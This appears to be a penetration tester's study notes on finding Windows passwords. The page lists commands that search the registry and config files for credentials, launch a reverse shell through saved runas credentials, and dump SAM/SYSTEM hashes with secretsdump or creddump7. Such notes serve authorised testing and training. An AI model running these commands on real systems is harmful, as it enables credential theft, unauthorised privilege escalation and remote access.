# Passwords

* Try different authentication methods if we find them as well as juggle the password for every single user just in case we can do some lateral movement .
* Try psexec because maybe we find a password for our current user but turns out that user reused his password to set up an administrator account
* try RDP
* try runas
* try the powesrshell run as variation
* try winexe -U "user%pass" //\<ip> cmd.exe

### Searching the Registry Passwords

```
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

### Saved Creds

Windows has a runas command which allows users to run commands with the privileges of other users. This usually requires the knowledge of the other user’s password. However, Windows also allows users to save their credentials to the system, and these saved credentials can be used to bypass this requirement.

![](../../../../.gitbook/assets/2022-08-11\_16-57.png)

To verify these are correct we can run the command cmdkey /list and if it doesnt show anything we need to run the savedcred.bat to restore them and rerun the command.

```
runas /savedcred /user:<nameo f the credentiasl> C:\path\to\nc.exe or reverse.exe
```

### Searching for Configuration Files

```
dir /s *pass* == *.config
findstr /si password *.xml *.ini *.txt
```

We should run this in directories where we think these will be, such as unusual folders because then it will become super overloaded with info.

Look at <mark style="color:red;">Unattended.xml</mark>

### SAM

SAM/SYSTEM locations

If we are able to read them we can secretsdump.py

or use&#x20;

{% embed url="http://github.com/Neohapsis/creddump7.git" %}

C:\Windows\System32\config

C:\Windows\Repair

C:\Windows\System32\config\RegBack
